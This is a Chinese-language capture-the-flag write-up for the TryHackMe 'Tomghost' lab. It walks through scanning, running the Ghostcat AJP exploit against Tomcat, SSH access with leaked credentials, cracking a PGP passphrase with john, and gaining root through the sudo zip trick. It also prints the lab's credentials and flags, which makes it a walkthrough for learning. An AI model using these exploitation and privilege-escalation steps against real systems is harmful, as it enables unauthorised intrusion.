# Tomghost Writeup
> URL : https://tryhackme.com/room/tomghost

IP : 10.10.9.138
## Scanning
- `nmap -A 10.10.9.138`
    - ![](https://i.imgur.com/KJKjqsB.png)
    - 有開的 port
        - 22 SSH 7.2ps
        - 53 tcpwarpped
        - 8009 AJP13 1.3
        - 8080 Tomcat 9.0.30
## Exploit
- 使用 searchsploit 搜尋 AJP
    - `searchsploit AJP`
    - 可以找到 `Apache Tomcat - AJP 'Ghostcat File Read/Inclusion`
        - https://www.exploit-db.com/exploits/48143
    - `wget https://www.exploit-db.com/download/48143`
    - `mv 48143 48143.py`
    - `python 48143.py `
        - ![](https://i.imgur.com/0SQat66.png)
        - 就直接噴出帳號密碼ㄌ
            - 帳號 : `skyfuck`
            - 密碼 : `8730281lkjlkjdqlksalks`
## SSH 進去晃晃
- `ssh skyfuck@10.10.9.138`
- 發現家目錄裡面有兩個檔案
    - ![](https://i.imgur.com/hq6I5CF.png)
    - 先抓出來
        - `scp -r skyfuck@10.10.9.138:/home/skyfuck .`
- 在 `/home/merlin` 發現 `user.txt`
    - `THM{GhostCat_1s_so_cr4sy}`

## 暴力破解 pgp
- 看到一個 asc 檔案 跟一個 pgp 檔案
    - 用 file 觀察他們在幹嘛
    - ![](https://i.imgur.com/OmGBxmK.png)
    - `.pgp` 是加密後ㄉ東西
    - `.asc` 的是 private key
- pgp 轉 john
    - `gpg2john tryhackme.asc > john_gpg`
    - 備註 : gpg 是開源版本的 pgp
        - ref :　https://zh.wikipedia.org/wiki/PGP
    - 我們要破的是 `.asc` 的 private key 檔案求密碼
- 用 john 爆破，With rockyou.txt
    - `john john_gpg --wordlist=/opt/rockyou.txt`
    - ![](https://i.imgur.com/cl2k7x5.png)
    - 破出密碼為 `alexandru`
- `gpg --decrypt  credential.pgp`
    - 輸入密碼
    - ![](https://i.imgur.com/Y1D3ND3.png)
        - 取得 `merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`
## 提權
- `su merlin`
	- 輸入密碼
- `sudo -l`
	- `(root : root) NOPASSWD: /usr/bin/zip`
	- 發現有 zip 的 sudo 權限
- 到 [GTFOBins](https://gtfobins.github.io/) 找 zip 提權方法
	- 可以 sudo 的
		- `TF=$(mktemp -u)`
		- `sudo zip $TF /etc/hosts -T -TT 'sh #'`
- 提權成功
	- ![](https://i.imgur.com/CuifiyF.png)
	- `root.txt` : `THM{Z1P_1S_FAKE}`